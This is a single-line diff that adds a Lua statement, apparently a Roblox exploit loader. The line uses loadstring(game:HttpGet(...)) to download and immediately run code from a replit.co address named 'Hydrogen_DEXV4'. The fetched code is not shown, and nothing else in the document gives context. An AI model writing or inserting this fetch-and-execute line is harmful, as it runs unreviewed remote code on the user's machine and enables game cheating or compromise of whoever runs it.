@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://dd2cd1e3-f65f-4408-82be-8b342e6e8322.id.repl.co/Hydrogen_DEXV4"))()
